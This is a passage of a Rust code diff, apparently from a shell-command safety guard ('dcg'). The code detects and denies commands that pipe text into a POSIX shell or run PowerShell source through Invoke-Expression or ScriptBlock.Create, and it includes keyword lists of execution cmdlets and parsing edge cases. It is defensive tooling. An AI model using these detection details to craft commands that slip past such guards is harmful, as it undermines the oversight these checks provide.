+    ) {
+        return PipelineShellInputMode::NotShell;
+    }
+
+    let mut force_stdin = false;
+    let mut index = 0usize;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            return if force_stdin || index + 1 == args.len() {
+                PipelineShellInputMode::ReadsStdin
+            } else {
+                PipelineShellInputMode::DoesNotReadStdin
+            };
+        }
+        if argument == "-" {
+            return PipelineShellInputMode::ReadsStdin;
+        }
+        if matches!(argument.as_str(), "--help" | "--version") {
+            return PipelineShellInputMode::DoesNotReadStdin;
+        }
+        if matches!(
+            argument.as_str(),
+            "-o" | "+o" | "-O" | "+O" | "--init-file" | "--rcfile"
+        ) {
+            if args.get(index + 1).is_none() {
+                return PipelineShellInputMode::Unverified;
+            }
+            index += 2;
+            continue;
+        }
+        if argument.starts_with("--init-file=") || argument.starts_with("--rcfile=") {
+            index += 1;
+            continue;
+        }
+        if matches!(argument.as_str(), "--command" | "--command=")
+            || argument.starts_with("--command=")
+        {
+            return PipelineShellInputMode::DoesNotReadStdin;
+        }
+        if let Some(flags) = argument
+            .strip_prefix('-')
+            .filter(|flags| !flags.is_empty() && !flags.starts_with('-'))
+        {
+            if flags.contains('c') {
+                return PipelineShellInputMode::DoesNotReadStdin;
+            }
+            force_stdin |= flags.contains('s');
+            index += 1;
+            continue;
+        }
+        return if force_stdin {
+            PipelineShellInputMode::ReadsStdin
+        } else {
+            PipelineShellInputMode::DoesNotReadStdin
+        };
+    }
+
+    PipelineShellInputMode::ReadsStdin
+}
+
+fn push_posix_pipeline_shell_source(producer: &str, sinks: &mut Vec<ExecutableTextSink>) {
+    if sinks.len() >= MAX_EXECUTABLE_TEXT_SINKS {
+        sinks.push(ExecutableTextSink::Unverified(
+            "command contains too many executable text sinks for bounded analysis",
+        ));
+        return;
+    }
+    let sink = match static_producer_source(producer) {
+        IndirectInputSource::StaticProducer(source) => ExecutableTextSink::Payload {
+            source,
+            dialect: ShellDialect::Posix,
+            context: "POSIX shell executes source received from a pipeline",
+        },
+        IndirectInputSource::File(_) | IndirectInputSource::PsqlStartupFile { .. } => {
+            ExecutableTextSink::Unverified(
+                "POSIX shell reads executable pipeline source from a file that dcg cannot verify without a race",
+            )
+        }
+        IndirectInputSource::Template { .. } | IndirectInputSource::Unverified(_) => {
+            ExecutableTextSink::Unverified(
+                "POSIX shell receives executable pipeline source that dcg cannot statically verify",
+            )
+        }
+    };
+    if !sinks.contains(&sink) {
+        sinks.push(sink);
+    }
+}
+
+/// Reconstruct literal producers that feed a bare POSIX shell. Pipeline bytes
+/// are executable source, not inert `echo`/`printf` argv, so they must recurse
+/// through the full evaluator before safe-string masking can hide them.
+fn collect_posix_pipeline_shell_sinks(command: &str, sinks: &mut Vec<ExecutableTextSink>) {
+    if !command.as_bytes().contains(&b'|') {
+        return;
+    }
+    let ast = AstGrep::new(command, SupportLang::Bash);
+    if ast_contains_error(ast.root()) {
+        return;
+    }
+    let mut pending = vec![ast.root()];
+    while let Some(node) = pending.pop() {
+        if node.kind().as_ref() == "pipeline" {
+            let stages: Vec<String> = node
+                .children()
+                .filter(|child| !matches!(child.kind().as_ref(), "comment" | "|" | "|&"))
+                .map(|child| child.text().to_string())
+                .collect();
+            for consumer_index in 1..stages.len() {
+                let consumer = &stages[consumer_index];
+                if input_redirect(consumer).is_some() {
+                    continue;
+                }
+                match pipeline_shell_input_mode(consumer) {
+                    PipelineShellInputMode::ReadsStdin => {
+                        let mut producer_index = consumer_index - 1;
+                        while producer_index > 0
+                            && is_literal_pipeline_passthrough(&stages[producer_index])
+                        {
+                            producer_index -= 1;
+                        }
+                        push_posix_pipeline_shell_source(&stages[producer_index], sinks);
+                    }
+                    PipelineShellInputMode::Unverified => {
+                        sinks.push(ExecutableTextSink::Unverified(
+                            "POSIX shell pipeline mode cannot be statically verified",
+                        ));
+                    }
+                    PipelineShellInputMode::NotShell | PipelineShellInputMode::DoesNotReadStdin => {
+                    }
+                }
+            }
+        }
+        pending.extend(node.children());
+        if sinks.len() > MAX_EXECUTABLE_TEXT_SINKS {
+            return;
+        }
+    }
+}
+
+fn powershell_word_equals(raw: &str, candidate: &str) -> bool {
+    let mut decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
+    decoder
+        .decode(raw, ShellTokenRole::Syntax)
+        .and_then(|word| {
+            powershell_unqualified_command_name(word.trim_start_matches('&')).map(str::to_string)
+        })
+        .is_some_and(|word| word.eq_ignore_ascii_case(candidate))
+}
+
+fn powershell_unqualified_command_name(word: &str) -> Option<&str> {
+    let Some((module, command)) = word.rsplit_once('\\') else {
+        return (!word.is_empty()).then_some(word);
+    };
+    if module.is_empty()
+        || command.is_empty()
+        || module.contains(['/', '\\'])
+        || !module
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
+    {
+        return None;
+    }
+    Some(command)
+}
+
+fn strip_powershell_iex_command_parameter(arguments: &str) -> Result<&str, ()> {
+    let arguments = arguments.trim_start();
+    let tokens = tokenize_for_shell_dialect(arguments, ShellDialect::PowerShell);
+    let Some(first) = tokens
+        .iter()
+        .find(|token| token.kind == NormalizeTokenKind::Word)
+    else {
+        return Ok(arguments);
+    };
+    let raw = first.text(arguments).ok_or(())?;
+    let mut decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
+    let decoded = decoder
+        .decode(raw, ShellTokenRole::Syntax)
+        .ok_or(())?
+        .to_ascii_lowercase();
+    if !decoded.starts_with('-') {
+        return Ok(arguments);
+    }
+    let parameter = decoded.trim_start_matches('-').trim_end_matches([':', '=']);
+    if parameter.len() < 1 || !"command".starts_with(parameter) {
+        return Err(());
+    }
+    Ok(arguments
+        .get(first.byte_range.end..)
+        .map(str::trim_start)
+        .unwrap_or_default())
+}
+
+fn collect_powershell_iex_sinks(command: &str, sinks: &mut Vec<ExecutableTextSink>) {
+    let tokens = tokenize_for_shell_dialect(command, ShellDialect::PowerShell);
+    for (token_index, command_token) in tokens.iter().enumerate() {
+        if command_token.kind != NormalizeTokenKind::Word {
+            continue;
+        }
+        if sinks.len() >= MAX_EXECUTABLE_TEXT_SINKS {
+            sinks.push(ExecutableTextSink::Unverified(
+                "command contains too many executable text sinks for bounded analysis",
+            ));
+            return;
+        }
+        let Some(raw_command) = command_token.text(command) else {
+            continue;
+        };
+        if !powershell_word_equals(raw_command, "iex")
+            && !powershell_word_equals(raw_command, "invoke-expression")
+        {
+            continue;
+        }
+        let previous = token_index
+            .checked_sub(1)
+            .and_then(|index| tokens.get(index));
+        let at_command_position =
+            powershell_token_at_command_boundary(&tokens, token_index, command);
+        let quoted_command = matches!(raw_command.as_bytes().first(), Some(b'\'' | b'"'));
+        let called_quoted_command = quoted_command
+            && previous
+                .and_then(|token| token.text(command))
+                .is_some_and(|separator| separator.trim() == "&");
+        if !at_command_position || quoted_command && !called_quoted_command {
+            continue;
+        }
+        let argument_end = tokens
+            .iter()
+            .filter(|token| {
+                token.kind == NormalizeTokenKind::Separator
+                    && token.byte_range.start >= command_token.byte_range.end
+            })
+            .filter_map(|token| {
+                let separator = token.text(command)?;
+                (!matches!(separator.trim(), "(" | ")")).then_some(token.byte_range.start)
+            })
+            .min()
+            .unwrap_or(command.len());
+        let arguments = command
+            .get(command_token.byte_range.end..argument_end)
+            .map(str::trim)
+            .unwrap_or_default();
+
+        let pipeline_source = previous
+            .filter(|token| {
+                token.kind == NormalizeTokenKind::Separator
+                    && token
+                        .text(command)
+                        .is_some_and(|separator| matches!(separator.trim(), "|" | "|&"))
+            })
+            .and_then(|pipe| command.get(..pipe.byte_range.start))
+            .map(|prefix| local_powershell_prefix(prefix).trim());
+        if let Some(source_expression) = pipeline_source {
+            if source_expression.is_empty() {
+                sinks.push(ExecutableTextSink::Unverified(
+                    "Invoke-Expression receives pipeline input that dcg cannot statically verify",
+                ));
+            } else {
+                match parse_static_powershell_source(source_expression) {
+                    Ok(source) => sinks.push(ExecutableTextSink::Payload {
+                        source,
+                        dialect: ShellDialect::PowerShell,
+                        context: "Invoke-Expression executes PowerShell source received from the pipeline",
+                    }),
+                    Err(()) => sinks.push(ExecutableTextSink::Unverified(
+                        "Invoke-Expression receives pipeline input that dcg cannot statically verify",
+                    )),
+                }
+            }
+
+            // With no explicit argument, the pipeline is the complete source.
+            // Do not reinterpret the absent argv as an empty safe expression.
+            if arguments.is_empty() {
+                continue;
+            }
+        }
+        let Ok(expression) = strip_powershell_iex_command_parameter(arguments) else {
+            sinks.push(ExecutableTextSink::Unverified(
+                "Invoke-Expression uses parameters that dcg cannot statically verify",
+            ));
+            continue;
+        };
+        match parse_static_powershell_source(expression) {
+            Ok(source) => sinks.push(ExecutableTextSink::Payload {
+                source,
+                dialect: ShellDialect::PowerShell,
+                context: "Invoke-Expression executes an embedded PowerShell command",
+            }),
+            Err(()) => sinks.push(ExecutableTextSink::Unverified(
+                "Invoke-Expression receives source that dcg cannot statically verify",
+            )),
+        }
+    }
+}
+
+fn find_powershell_code_marker(command: &str, marker: &str, start: usize) -> Option<usize> {
+    let bytes = command.as_bytes();
+    let marker_bytes = marker.as_bytes();
+    let mut index = start;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                index = skip_powershell_block_comment(command, index);
+            }
+            b'\'' => index = skip_powershell_single_quote(command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                index =
+                    powershell_here_string_end(command, index).map_or(index + 1, |(_, _, end)| end);
+            }
+            _ => {
+                if bytes
+                    .get(index..index.saturating_add(marker_bytes.len()))
+                    .is_some_and(|candidate| candidate.eq_ignore_ascii_case(marker_bytes))
+                {
+                    return Some(index);
+                }
+                index += command[index..].chars().next()?.len_utf8();
+            }
+        }
+    }
+    None
+}
+
+fn find_powershell_scriptblock_type_literal(command: &str, start: usize) -> Option<(usize, usize)> {
+    let mut search_start = start;
+    while search_start < command.len() {
+        let type_start = find_powershell_code_marker(command, "[", search_start)?;
+        let Some(relative_close) = command.get(type_start + 1..)?.find(']') else {
+            search_start = type_start + 1;
+            continue;
+        };
+        let type_end = type_start + relative_close + 2;
+        let normalized: String = command[type_start + 1..type_end - 1]
+            .chars()
+            .filter(|character| !character.is_whitespace())
+            .collect();
+        if normalized.eq_ignore_ascii_case("scriptblock")
+            || normalized.eq_ignore_ascii_case("system.management.automation.scriptblock")
+        {
+            return Some((type_start, type_end));
+        }
+        search_start = type_start + 1;
+    }
+    None
+}
+
+fn find_powershell_scriptblock_create(command: &str, start: usize) -> Option<(usize, usize)> {
+    let mut search_start = start;
+    while search_start < command.len() {
+        let (type_start, type_end) =
+            find_powershell_scriptblock_type_literal(command, search_start)?;
+        let mut index = type_end;
+        while command
+            .as_bytes()
+            .get(index)
+            .is_some_and(u8::is_ascii_whitespace)
+        {
+            index += 1;
+        }
+        if command.as_bytes().get(index..index + 2) != Some(b"::") {
+            search_start = type_start + 1;
+            continue;
+        }
+        index += 2;
+        while command
+            .as_bytes()
+            .get(index)
+            .is_some_and(u8::is_ascii_whitespace)
+        {
+            index += 1;
+        }
+        let Some(candidate) = command.get(index..index + "create".len()) else {
+            search_start = type_start + 1;
+            continue;
+        };
+        if candidate.eq_ignore_ascii_case("create")
+            && command
+                .as_bytes()
+                .get(index + "create".len())
+                .is_none_or(|byte| byte.is_ascii_whitespace() || *byte == b'(')
+        {
+            return Some((type_start, index + "create".len()));
+        }
+        search_start = type_start + 1;
+    }
+    None
+}
+
+fn local_powershell_prefix(prefix: &str) -> &str {
+    prefix.rsplit([';', '\n', '|']).next().unwrap_or(prefix)
+}
+
+fn powershell_words_begin_with_scriptblock_consumer(
+    words: &[(String, bool, std::ops::Range<usize>)],
+) -> bool {
+    let Some((command, dynamic, _)) = words.first() else {
+        return false;
+    };
+    if *dynamic {
+        return false;
+    }
+    let Some(command) = powershell_unqualified_command_name(command) else {
+        return false;
+    };
+    matches!(
+        command.to_ascii_lowercase().as_str(),
+        "invoke-command"
+            | "icm"
+            | "start-job"
+            | "sajb"
+            | "start-threadjob"
+            | "foreach-object"
+            | "foreach"
+            | "%"
+            | "where-object"
+            | "where"
+            | "?"
+    )
+}
+
+fn powershell_scriptblock_consumer_tail(prefix: &str) -> Option<&str> {
+    let tokens = tokenize_for_shell_dialect(prefix, ShellDialect::PowerShell);
+    tokens
+        .iter()
+        .enumerate()
+        .filter(|(index, token)| {
+            if token.kind != NormalizeTokenKind::Word
+                || !powershell_token_at_command_boundary(&tokens, *index, prefix)
+            {
+                return false;
+            }
+            token.text(prefix).is_some_and(|raw| {
+                !raw.starts_with(['\'', '"'])
+                    && [
+                        "invoke-command",
+                        "icm",
+                        "start-job",
+                        "sajb",
+                        "start-threadjob",
+                        "foreach-object",
+                        "foreach",
+                        "%",
+                        "where-object",
+                        "where",
+                        "?",
+                    ]
+                    .iter()
+                    .any(|candidate| powershell_word_equals(raw, candidate))
+            })
+        })
+        .filter_map(|(_, token)| prefix.get(token.byte_range.start..))
+        .next_back()
+}
+
+fn powershell_prefix_executes_scriptblock(prefix: &str) -> bool {
+    let Some(consumer_tail) = powershell_scriptblock_consumer_tail(prefix) else {
+        return false;
+    };
+    let Some(words) = decoded_powershell_segment_words(consumer_tail) else {
+        return false;
+    };
+    if !powershell_words_begin_with_scriptblock_consumer(&words) {
+        return false;
+    }
+    // Bind the expression to the parameter immediately before it. Looking for
+    // any earlier ScriptBlock-valued parameter is incorrect when the Create
+    // expression belongs to a later data parameter, e.g. Invoke-Command's
+    // `-ArgumentList ([scriptblock]::Create(...))`.
+    if let Some((parameter, dynamic, _)) = words.last()
+        && !*dynamic
+        && parameter.starts_with('-')
+    {
+        if [
+            "scriptblock",
+            "process",
+            "filterscript",
+            "initializationscript",
+            "begin",
+            "end",
+            "parallel",
+            "remainingscripts",
+        ]
+        .iter()
+        .any(|candidate| powershell_alias_parameter(parameter, candidate))
+        {
+            return true;
+        }
+
+        // A switch does not consume the following expression, so the normal
+        // positional ScriptBlock binding still applies after it.
+        if [
+            "asjob",
+            "usenewrunspace",
+            "nonewscope",
+            "hidecomputername",
+            "enablenetworkaccess",
+            "indisconnectedsession",
+            "runas32",
+            "verbose",
+            "debug",
+            "whatif",
+            "confirm",
+        ]
+        .iter()
+        .any(|candidate| powershell_alias_parameter(parameter, candidate))
+        {
+            return true;
+        }
+
+        // Any other immediately preceding parameter receives this expression
+        // as data, not as the consumer's positional ScriptBlock.
+        return false;
+    }
+
+    // The object/property forms of these pipeline cmdlets treat following
+    // values as data rather than executable ScriptBlocks.
+    let command = powershell_unqualified_command_name(&words[0].0)
+        .unwrap_or(&words[0].0)
+        .to_ascii_lowercase();
+    let has_parameter = |candidate: &str| {
+        words
+            .iter()
+            .skip(1)
+            .any(|(word, dynamic, _)| !*dynamic && powershell_alias_parameter(word, candidate))
+    };
+    if matches!(command.as_str(), "where-object" | "where" | "?") && has_parameter("property") {
+        return false;
+    }
+    if matches!(command.as_str(), "foreach-object" | "foreach" | "%") && has_parameter("membername")
+    {
+        return false;
+    }
+    true
+}
+
+fn powershell_prefix_opens_executable_block(prefix: &str) -> bool {
+    let local = prefix
+        .rsplit([';', '\r', '\n', '|', '{', '}'])
+        .next()
+        .unwrap_or(prefix)
+        .trim();
+    if local.is_empty() {
+        return false;
+    }
+    if powershell_prefix_ends_with_execution_operator(local)
+        || powershell_prefix_executes_scriptblock(local)
+    {
+        return true;
+    }
+
+    let Some(words) = decoded_powershell_segment_words(local) else {
+        return false;
+    };
+    let Some((command, dynamic, _)) = words.first() else {
+        return false;
+    };
+    if *dynamic {
+        return false;
+    }
+    matches!(
+        command.to_ascii_lowercase().as_str(),
+        "if" | "elseif"
+            | "else"
+            | "switch"
+            | "while"
+            | "for"
+            | "foreach"
+            | "do"
+            | "try"
+            | "catch"
+            | "finally"
+            | "trap"
+    )
+}
+
+fn powershell_executable_block_bodies(command: &str) -> Result<Vec<&str>, ()> {
+    let mut bodies = Vec::new();
+    let mut search_start = 0usize;
+    while search_start < command.len() {
+        let Some(open) = find_powershell_code_marker(command, "{", search_start) else {
+            break;
+        };
+        let Some(close) = find_powershell_script_block_close(command, open + 1) else {
+            return Err(());
+        };
+        if powershell_prefix_opens_executable_block(&command[..open]) {
+            if bodies.len() >= MAX_POWERSHELL_VISIBLE_STATEMENTS {
+                return Err(());
+            }
+            bodies.push(command.get(open + 1..close).ok_or(())?);
+        }
+
+        // Nested blocks inside an executable body are visited by the recursive
+        // evaluator. Nested blocks inside an inert ScriptBlock literal must not
+        // be treated as executing merely because they contain control flow.
+        search_start = close + 1;
+    }
+    Ok(bodies)
+}
+
+fn powershell_prefix_ends_with_execution_operator(prefix: &str) -> bool {
+    let bytes = prefix.as_bytes();
+    let mut end = bytes.len();
+    loop {
+        while end > 0 && bytes[end - 1].is_ascii_whitespace() {
+            end -= 1;
+        }
+        if end > 0 && bytes[end - 1] == b'(' {
+            end -= 1;
+            continue;
+        }
+        break;
+    }
+    if end == 0 {
+        return false;
+    }
+    match bytes[end - 1] {
+        b'&' => end == 1 || bytes[end - 2] != b'&',
+        b'.' => {
+            // Dot-sourcing requires whitespace between `.` and its operand;
+            // member access and relative paths must remain inert here.
+            prefix[end..].bytes().any(|byte| byte.is_ascii_whitespace())
+                && (end == 1
+                    || bytes[end - 2].is_ascii_whitespace()
+                    || matches!(bytes[end - 2], b'(' | b'{' | b';' | b'|'))
+        }
+        _ => false,
+    }
+}
+
+fn powershell_scriptblock_create_is_executed(
+    command: &str,
+    marker_start: usize,
+    argument_close: usize,
+) -> bool {
+    let local_prefix = local_powershell_prefix(&command[..marker_start]);
+    let call_operator = powershell_prefix_ends_with_execution_operator(local_prefix);
+    let named_or_positional_consumer = powershell_prefix_executes_scriptblock(local_prefix);
+
+    let mut suffix = command[argument_close + 1..].trim_start();
+    while let Some(rest) = suffix.strip_prefix(')') {
+        suffix = rest.trim_start();
+    }
+    let invoked_method = powershell_method_invocation(suffix, ".invoke")
+        || powershell_method_invocation(suffix, ".invokereturnasis")
+        || powershell_method_invocation(suffix, ".invokewithcontext");
+    call_operator || named_or_positional_consumer || invoked_method
+}
+
+fn collect_powershell_scriptblock_sinks(command: &str, sinks: &mut Vec<ExecutableTextSink>) {
+    let mut search_start = 0usize;
+    while let Some((marker_start, marker_end)) =
+        find_powershell_scriptblock_create(command, search_start)
+    {
+        if sinks.len() >= MAX_EXECUTABLE_TEXT_SINKS {
+            sinks.push(ExecutableTextSink::Unverified(
+                "command contains too many executable text sinks for bounded analysis",
+            ));
+            return;
+        }
+        let mut open = marker_end;
+        while command
+            .as_bytes()
+            .get(open)
+            .is_some_and(u8::is_ascii_whitespace)
+        {
+            open += 1;
+        }
+        if command.as_bytes().get(open) != Some(&b'(') {
+            search_start = open.max(marker_start + 1);
+            continue;
+        }
+        let Ok(close) = find_powershell_subexpression_close(command, open + 1) else {
+            sinks.push(ExecutableTextSink::Unverified(
+                "ScriptBlock.Create has unbalanced source syntax",
+            ));
+            return;
+        };
+        if powershell_scriptblock_create_is_executed(command, marker_start, close) {
+            let expression = &command[open + 1..close];
+            match parse_static_powershell_source(expression) {
+                Ok(source) => sinks.push(ExecutableTextSink::Payload {
+                    source,
+                    dialect: ShellDialect::PowerShell,
+                    context: "an invoked ScriptBlock executes embedded PowerShell source",
+                }),
+                Err(()) => sinks.push(ExecutableTextSink::Unverified(
+                    "an invoked ScriptBlock receives source that dcg cannot statically verify",
+                )),
+            }
+        }
+        search_start = close + 1;
+    }
+}
+
+fn mask_inert_powershell_scriptblock_sources<'a>(
+    command_for_match: &'a str,
+    original_command: &str,
+    dialect: ShellDialect,
+) -> Cow<'a, str> {
+    if dialect != ShellDialect::PowerShell
+        || command_for_match.len() != original_command.len()
+        || find_powershell_scriptblock_create(original_command, 0).is_none()
+    {
+        return Cow::Borrowed(command_for_match);
+    }
+
+    let mut masked: Option<Vec<u8>> = None;
+    let mut search_start = 0usize;
+    let mut seen = 0usize;
+    while let Some((marker_start, marker_end)) =
+        find_powershell_scriptblock_create(original_command, search_start)
+    {
+        seen += 1;
+        if seen > MAX_EXECUTABLE_TEXT_SINKS {
+            return Cow::Borrowed(command_for_match);
+        }
+        let mut open = marker_end;
+        while original_command
+            .as_bytes()
+            .get(open)
+            .is_some_and(u8::is_ascii_whitespace)
+        {
+            open += 1;
+        }
+        if original_command.as_bytes().get(open) != Some(&b'(') {
+            search_start = open.max(marker_start + 1);
+            continue;
+        }
+        let Ok(close) = find_powershell_subexpression_close(original_command, open + 1) else {
+            return Cow::Borrowed(command_for_match);
+        };
+        if !powershell_scriptblock_create_is_executed(original_command, marker_start, close) {
+            let bytes = masked.get_or_insert_with(|| command_for_match.as_bytes().to_vec());
+            for byte in &mut bytes[open + 1..close] {
+                if !matches!(*byte, b'\r' | b'\n') {
+                    *byte = b' ';
+                }
+            }
+        }
+        search_start = close + 1;
+    }
+
+    masked.map_or(Cow::Borrowed(command_for_match), |bytes| {
+        Cow::Owned(String::from_utf8(bytes).expect("ASCII masking preserves valid UTF-8"))
+    })
+}
+
+/// Restore literal `$()` text inside a PowerShell here-string after the generic
+/// safe-argument sanitizer has masked it. A single-quoted here-string does not
+/// expand in the current statement, but it is still a first-class string value
+/// that can flow into `&`, dot-sourcing, `Invoke-Expression`, or another sink.
+/// Until full data-flow analysis can prove otherwise, retaining this explicit
+/// command-shaped text is the sound fail-closed behavior.
+fn restore_powershell_here_string_substitution_text<'a>(
+    command_for_match: &'a str,
+    original_command: &str,
+    dialect: ShellDialect,
+) -> Cow<'a, str> {
+    if dialect != ShellDialect::PowerShell
+        || command_for_match.len() != original_command.len()
+        || !original_command.contains("$(")
+        || !original_command.contains('@')
+    {
+        return Cow::Borrowed(command_for_match);
+    }
+
+    let bytes = original_command.as_bytes();
+    let mut restored: Option<Vec<u8>> = None;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = original_command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                index = skip_powershell_block_comment(original_command, index);
+            }
+            b'\'' => index = skip_powershell_single_quote(original_command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                let Some((_, content_start, end)) =
+                    powershell_here_string_end(original_command, index)
+                else {
+                    index += 1;
+                    continue;
+                };
+                let content_end = end.saturating_sub(2);
+                if original_command[content_start..content_end].contains("$(") {
+                    let output =
+                        restored.get_or_insert_with(|| command_for_match.as_bytes().to_vec());
+                    output[content_start..content_end]
+                        .copy_from_slice(&bytes[content_start..content_end]);
+                }
+                index = end;
+            }
+            _ => {
+                index += original_command[index..]
+                    .chars()
+                    .next()
+                    .map_or(1, char::len_utf8);
+            }
+        }
+    }
+
+    restored.map_or(Cow::Borrowed(command_for_match), |bytes| {
+        Cow::Owned(String::from_utf8(bytes).expect("same-range restoration preserves UTF-8"))
+    })
+}
+
+fn collect_executable_text_sinks(command: &str, dialect: ShellDialect) -> Vec<ExecutableTextSink> {
+    let mut sinks = Vec::new();
+    if matches!(dialect, ShellDialect::Posix | ShellDialect::Unknown) {
+        collect_posix_eval_sinks(command, &mut sinks);
+        collect_posix_pipeline_shell_sinks(command, &mut sinks);
+    }
+    if matches!(dialect, ShellDialect::PowerShell | ShellDialect::Unknown) {
+        collect_powershell_iex_sinks(command, &mut sinks);
+        collect_powershell_scriptblock_sinks(command, &mut sinks);
+    }
+    sinks
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_executable_text_sinks(
+    command: &str,
+    shell_dialect: ShellDialect,
+    nested_command_depth: usize,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    let sinks = collect_executable_text_sinks(command, shell_dialect);
+    for sink in sinks {
+        let (source, dialect, context) = match sink {
+            ExecutableTextSink::Unverified(reason) => {
+                return Some(EvaluationResult::denied_by_legacy(reason));
+            }
+            ExecutableTextSink::Payload {
+                source,
+                dialect,
+                context,
+            } => (source, dialect, context),
+        };
+        if nested_command_depth >= MAX_EMBEDDED_SHELL_DEPTH
+            || source.len() > heredoc_settings.limits.max_body_bytes
+        {
+            return Some(EvaluationResult::denied_by_legacy(
+                "executable text source exceeds dcg's bounded static-analysis limit",
+            ));
+        }
+        let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+            &source,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            dialect,
+            nested_command_depth + 1,
+            inherited_automated_stdin,
+        );
+        if result.skipped_due_to_budget {
+            return Some(EvaluationResult::denied_by_legacy(
+                "executable text source analysis exceeded dcg's deadline",
+            ));
+        }
+        if result.is_denied() {
+            if let Some(info) = result.pattern_info.as_mut() {
+                info.reason = format!("{context}: {}", info.reason);
+                info.matched_span = None;
+                info.matched_text_preview = None;
+            }
+            return Some(result);
+        }
+        if first_allowlist_hit.is_none() {
+            if let Some(allowlist_override) = result.allowlist_override.take() {
+                let mut matched = allowlist_override.matched;
+                matched.matched_span = None;
+                matched.matched_text_preview = None;
+                *first_allowlist_hit =
+                    Some((matched, allowlist_override.layer, allowlist_override.reason));
+            }
+        }
+    }
+    None
+}
+
+fn source_position_receives_automated_stdin(
+    command: &str,
+    source_start: usize,
+    dialect: ShellDialect,
+) -> bool {
+    let segment_start = command_segment_ranges_in_dialect(command, dialect)
+        .into_iter()
+        .filter(|&(start, end)| source_start >= start && source_start < end)
+        .map(|(start, _)| start)
+        .min()
+        .unwrap_or(source_start);
+    crate::packs::core::filesystem::rm_segment_receives_automated_stdin(
+        command,
+        segment_start,
+        dialect,
+    )
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_command_substitutions(
+    command: &str,
+    shell_dialect: ShellDialect,
+    nested_command_depth: usize,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    let substitutions: Vec<(String, ShellDialect, Option<usize>, bool)> = match shell_dialect {
+        ShellDialect::Posix => {
+            let substitution_source = crate::heredoc::mask_non_expanding_data_heredocs(command);
+            match crate::heredoc::extract_posix_command_substitutions(substitution_source.as_ref())
+            {
+                Ok(substitutions) => substitutions
+                    .into_iter()
+                    .map(|substitution| {
+                        (
+                            substitution.body,
+                            ShellDialect::Posix,
+                            Some(substitution.start),
+                            false,
+                        )
+                    })
+                    .collect(),
+                Err(_) => {
+                    return Some(EvaluationResult::denied_by_legacy(
+                        "POSIX command substitution could not be parsed without shell-grammar recovery",
+                    ));
+                }
+            }
+        }
+        ShellDialect::PowerShell => {
+            let executable_bodies = match collect_powershell_substitution_bodies(command) {
+                Ok(bodies) => bodies,
+                Err(()) => {
+                    return Some(EvaluationResult::denied_by_legacy(
+                        "PowerShell substitution contains comment syntax that dcg cannot statically disambiguate",
+                    ));
+                }
+            };
+            let verbatim_value_bodies =
+                match collect_powershell_verbatim_here_string_substitution_bodies(command) {
+                    Ok(bodies) => bodies,
+                    Err(()) => {
+                        return Some(EvaluationResult::denied_by_legacy(
+                            "PowerShell verbatim here-string contains syntax that dcg cannot statically disambiguate",
+                        ));
+                    }
+                };
+            executable_bodies
+                .into_iter()
+                .map(|body| (body, ShellDialect::PowerShell, None, false))
+                .chain(
+                    verbatim_value_bodies
+                        .into_iter()
+                        .map(|body| (body, ShellDialect::PowerShell, None, true)),
+                )
+                .collect()
+        }
+        ShellDialect::Unknown => {
+            let substitution_source = crate::heredoc::mask_non_expanding_data_heredocs(command);
+            let posix_view = mask_powershell_block_comments(substitution_source.as_ref());
+            let posix_substitutions = match crate::heredoc::extract_posix_command_substitutions(
+                posix_view.as_ref(),
+            ) {
+                Ok(substitutions) => substitutions,
+                Err(_) => {
+                    return Some(EvaluationResult::denied_by_legacy(
+                        "ambiguous command substitution could not be parsed as POSIX shell syntax",
+                    ));
+                }
+            };
